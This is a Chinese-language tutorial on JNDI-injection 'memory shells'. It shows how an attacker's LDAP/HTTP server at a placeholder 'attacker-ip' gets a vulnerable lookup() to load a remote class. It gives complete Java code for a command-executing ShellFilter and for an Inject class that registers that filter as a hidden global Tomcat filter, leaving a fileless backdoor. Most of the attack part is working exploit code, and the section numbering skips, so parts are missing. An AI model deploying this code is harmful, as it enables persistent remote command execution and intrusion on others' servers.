<h2 class="md-end-block md-heading"><span class="md-plain">1. 基本概念</span></h2>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">JNDI 注入内存马</span></strong></span><span class="md-plain"> 是结合 </span><span class="md-pair-s "><strong><span class="md-plain">JNDI 注入漏洞</span></strong></span><span class="md-plain"> 与内存马技术的复合型攻击手段。其核心逻辑是：利用 JNDI 服务动态加载远程恶意类的特性，在受害者服务器上执行恶意代码，进而动态注册 Filter/Servlet 等内存马组件，实现无文件落地的持久化控制。</span></p>
<img class="alignnone size-large wp-image-903" src="/wp-content/uploads/2025/img-ea3436feb567.png" alt="" width="1024" height="776" />
<h3 class="md-end-block md-heading"><span class="md-plain">核心特性</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">跨框架兼容性</span></strong></span><span class="md-plain">：依托 JNDI 标准 API（Java Naming and Directory Interface），可在 Tomcat、Jetty 等主流 Web 容器及 Spring Boot 等框架中利用，不依赖特定中间件私有机制。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">攻击链路隐蔽</span></strong></span><span class="md-plain">：恶意类通过远程 HTTP 服务器托管，注入过程仅需触发 </span><span class="md-pair-s" spellcheck="false"><code>context.lookup()</code></span><span class="md-plain"> 方法，无本地文件写入操作，常规日志难以追踪。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本限制</span></strong></span><span class="md-plain">：受 JDK 安全策略影响，JDK 8u191、7u201 及以上版本默认关闭 </span><span class="md-pair-s" spellcheck="false"><code>trustURLCodebase</code></span><span class="md-plain">（远程类加载开关），需特定绕过手段（本文聚焦基础利用场景，暂不展开绕过）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">链式攻击能力</span></strong></span><span class="md-plain">：JNDI 注入仅作为 “初始入口”，最终通过动态注册 Filter/Servlet 等组件形成内存马，实现长期控制。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">常见利用场景</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者利用存在 JNDI 注入漏洞的组件（如 Log4j2、Fastjson、Struts2），构造恶意 JNDI 地址（LDAP/RMI）诱导受害者触发。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过远程加载的恶意类，在受害者服务器中动态注册全局 Filter 内存马，实现所有请求的命令执行劫持。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注入后删除远程恶意类文件，仅留存内存中的 Filter/Servlet，形成 “无迹” 后门。</span></p>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">2.2 JNDI 注入核心原理</span></h3>
<p class="md-end-block md-p"><span class="md-plain">当 </span><span class="md-pair-s" spellcheck="false"><code>Context.lookup(String name)</code></span><span class="md-plain"> 方法的 </span><span class="md-pair-s" spellcheck="false"><code>name</code></span><span class="md-plain"> 参数可控时，攻击者可构造如下恶意链路：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者搭建 </span><span class="md-pair-s "><strong><span class="md-plain">LDAP/RMI 服务</span></strong></span><span class="md-plain"> 与 </span><span class="md-pair-s "><strong><span class="md-plain">HTTP 服务器</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">HTTP 服务器托管编译后的恶意类（如 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">LDAP/RMI 服务将对象引用指向 HTTP 服务器的恶意类地址（如 </span><span class="md-pair-s" spellcheck="false"><code>http://attacker-ip/Inject.class</code></span><span class="md-plain">）。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">受害者执行可控代码 </span><span class="md-pair-s" spellcheck="false"><code>context.lookup(&quot;ldap://attacker-ip:1389/Inject&quot;)</code></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">JNDI 客户端向攻击者的 LDAP 服务发送请求。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">LDAP 服务返回包含恶意类地址的 </span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain"> 对象。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">JNDI 客户端解析 </span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">，从 HTTP 服务器下载恶意类并实例化。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">恶意类的 </span><span class="md-pair-s "><strong><span class="md-plain">静态代码块、构造方法或实例初始化块</span></strong></span><span class="md-plain"> 自动执行，触发后续内存马注册逻辑。</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">3. JNDI 注入内存马实现机制</span></h2>
<p class="md-end-block md-p"><span class="md-plain">JNDI 注入内存马的核心是 “</span><span class="md-pair-s "><strong><span class="md-plain">远程恶意类 + 动态注册内存马</span></strong></span><span class="md-plain">”，实现步骤分为 </span><span class="md-pair-s "><strong><span class="md-plain">攻击端准备</span></strong></span><span class="md-plain"> 与 </span><span class="md-pair-s "><strong><span class="md-plain">受害者端触发</span></strong></span><span class="md-plain"> 两部分：</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.1 核心难点突破</span></h3>
<p class="md-end-block md-p"><span class="md-plain">JNDI 注入中，恶意类的自动执行代码块（静态块、构造方法）无 </span><span class="md-pair-s" spellcheck="false"><code>Request</code></span><span class="md-plain"> 等 Web 上下文参数，需通过以下方式获取 Tomcat 核心容器（</span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain">）：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Tomcat 容器</span></strong></span><span class="md-plain">：通过当前线程的类加载器（</span><span class="md-pair-s" spellcheck="false"><code>WebappClassLoaderBase</code></span><span class="md-plain">）逐层反射获取 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain">，代码逻辑如下：</span></p>



```
// 获取 Tomcat 的 StandardContext 容器
public StandardContext getTomcatContext() {
    // 1. 获取当前线程的 Web 应用类加载器
    WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    // 2. 从类加载器获取资源管理对象 StandardRoot
    StandardRoot standardRoot = (StandardRoot) classLoader.getResources();
    // 3. 从 StandardRoot 获取 StandardContext
    return (StandardContext) standardRoot.getContext();
}
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Spring Boot 框架</span></strong></span><span class="md-plain">：可通过 </span><span class="md-pair-s" spellcheck="false"><code>RequestContextHolder</code></span><span class="md-plain"> 获取当前请求上下文，进而获取 </span><span class="md-pair-s" spellcheck="false"><code>ServletContext</code></span><span class="md-plain">，再反射得到 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain">：</span></p>



```
// Spring 环境中获取 Request
HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
ServletContext servletContext = request.getServletContext();
// 后续反射步骤同 Tomcat 环境
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.2 实现步骤拆解</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">攻击端：编写恶意类（Inject.class）</span></strong></span> <span class="md-plain">恶意类需包含两部分逻辑：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">从 HTTP 服务器动态加载内存马组件（如 Filter）的字节码（避免多文件依赖）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">反射调用 Tomcat API 注册 Filter 内存马。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">攻击端：搭建服务</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启动 HTTP 服务器，托管 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain"> 与 Filter 字节码（或直接在 </span><span class="md-pair-s" spellcheck="false"><code>Inject</code></span><span class="md-plain"> 中内置 Filter 字节码的 Base64 编码）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启动 LDAP/RMI 服务，将对象引用指向 HTTP 服务器的 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain">。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">受害者端：触发 JNDI 注入</span></strong></span> <span class="md-plain">受害者执行含可控参数的 </span><span class="md-pair-s" spellcheck="false"><code>lookup()</code></span><span class="md-plain"> 方法，下载并实例化 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain">，触发 Filter 内存马注册。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">触发内存马</span></strong></span> <span class="md-plain">注册完成后，所有请求携带特定参数（如 </span><span class="md-pair-s" spellcheck="false"><code>cmd</code></span><span class="md-plain">）即可执行恶意逻辑。</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">4. 示例代码（完整攻击链路）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">4.1 步骤 1：编写内存马组件（ShellFilter.java）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">定义全局 Filter，实现命令执行功能：</span></p>



```
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.Process;
​
// 恶意 Filter：接收 cmd 参数执行系统命令
public class ShellFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) {} // 初始化方法空实现
​
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException {
        // 1. 获取 cmd 参数
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            // 2. 执行系统命令
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
            // 3. 将命令结果写入响应
            response.setContentType("text/plain;charset=GBK");
            String line;
            while ((line = br.readLine()) != null) {
                response.getWriter().println(line);
           }
            br.close();
            process.destroy();
            return; // 终止请求传递，避免干扰结果
       }
        // 无 cmd 参数时，正常转发请求
        try {
            chain.doFilter(request, response);
       } catch (ServletException e) {
            e.printStackTrace();
       }
   }
​
    @Override
    public void destroy() {} // 销毁方法空实现
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">4.2 步骤 2：将 ShellFilter 转为 Base64 字节码</span></h3>
<p class="md-end-block md-p"><span class="md-plain">由于 JNDI 一次仅能加载一个远程类，需将 </span><span class="md-pair-s" spellcheck="false"><code>ShellFilter</code></span><span class="md-plain"> 的字节码转为 Base64 编码，嵌入 </span><span class="md-pair-s" spellcheck="false"><code>Inject</code></span><span class="md-plain"> 类中（避免多文件依赖）。使用 </span><span class="md-pair-s" spellcheck="false"><code>javassist</code></span><span class="md-plain"> 工具实现编码：</span></p>



```
import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;
​
// 生成 ShellFilter.class 的 Base64 编码
public class FilterToBase64 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        // 加载 ShellFilter 类
        CtClass ctClass = pool.get("ShellFilter");
        // 转为字节数组并 Base64 编码
        byte[] filterBytes = ctClass.toBytecode();
        String base64Code = Base64.getEncoder().encodeToString(filterBytes);
        System.out.println("ShellFilter Base64 编码：");
        System.out.println(base64Code); // 复制此结果，后续嵌入 Inject 类
   }
}
```

 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">依赖：需在 </span><span class="md-pair-s" spellcheck="false"><code>pom.xml</code></span><span class="md-plain"> 中添加 </span><span class="md-pair-s" spellcheck="false"><code>javassist</code></span><span class="md-plain"> 依赖：</span></p>



```
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.29.2-GA</version>
</dependency>
```

<h3 class="md-end-block md-heading"><span class="md-plain">4.3 步骤 3：编写恶意注入类（Inject.java）</span></h3>
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>Inject</code></span><span class="md-plain"> 类通过构造方法自动执行，核心逻辑为：获取 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain"> → 动态加载 </span><span class="md-pair-s" spellcheck="false"><code>ShellFilter</code></span><span class="md-plain"> → 注册为全局 Filter：</span></p>



```
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.Filter;
import java.lang.reflect.Method;
import java.util.Base64;
​
public class Inject {
    // 1. 从 Base64 解码并加载 ShellFilter 类
    private Filter loadShellFilter() throws Exception {
        // 替换为步骤2生成的 ShellFilter Base64 编码
        String filterBase64 = "yv66vgAAADQAXwoADwA0CAArCwA1ADYKADcAOAoANwA5BwA6BwA7CgA8AD0KAAcAPgoABgA/CgAGAEAL..."
        byte[] filterBytes = Base64.getDecoder().decode(filterBase64);
        
        // 反射调用 ClassLoader.defineClass 加载类（绕过类加载器检查）
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true); // 突破私有方法访问限制
        Class<?> filterClass = (Class<?>) defineClassMethod.invoke(classLoader, filterBytes, 0, filterBytes.length);
        
        // 实例化 Filter
        return (Filter) filterClass.newInstance();
   }
​
    // 2. 获取 Tomcat 的 StandardContext 容器
    private StandardContext getStandardContext() {
        WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardRoot standardRoot = (StandardRoot) classLoader.getResources();
        return (StandardContext) standardRoot.getContext();
   }
​
    // 3. 构造方法：自动执行注入逻辑
    public Inject() throws Exception {
        try {
            // 获取容器与 Filter 实例
            StandardContext context = getStandardContext();
            Filter shellFilter = loadShellFilter();
            
            // 4. 创建 Filter 定义（FilterDef）
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName("jndi-shell-filter"); // 自定义 Filter 名称
            filterDef.setFilter(shellFilter);
            filterDef.setFilterClass(shellFilter.getClass().getName());
            
            // 5. 创建 Filter 映射（FilterMap）：全局匹配所有请求
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName("jndi-shell-filter");
            filterMap.addURLPattern("/*"); // 匹配所有 URL
            
            // 6. 注册 Filter 到容器
            context.addFilterDef(filterDef);
            context.addFilterMapBefore(filterMap); // 优先级高于现有 Filter
            context.filterStart(); // 激活 Filter 机制
            
            System.out.println("JNDI 注入内存马（Filter）注册成功！");
       } catch (Exception e) {
            System.err.println("注入失败：" + e.getMessage());
            e.printStackTrace();
       }
   }
}
```

<h3 class="md-end-block md-heading"><span class="md-plain">6.3 常见失败原因</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">JDK 版本过高</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>trustURLCodebase=false</code></span><span class="md-plain"> 导致无法加载远程 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain">，需使用绕过手段（如利用本地类工厂）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Tomcat 版本不兼容</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>WebappClassLoaderBase</code></span><span class="md-plain"> 在 Tomcat 8.5+ 中部分方法变更，需调整 </span><span class="md-pair-s" spellcheck="false"><code>getStandardContext()</code></span><span class="md-plain"> 逻辑。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Base64 编码错误</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>ShellFilter</code></span><span class="md-plain"> 的 Base64 编码包含换行符或错误字符，导致解码失败，需确保编码完整且无多余字符。</span></p>
</li>
</ol>
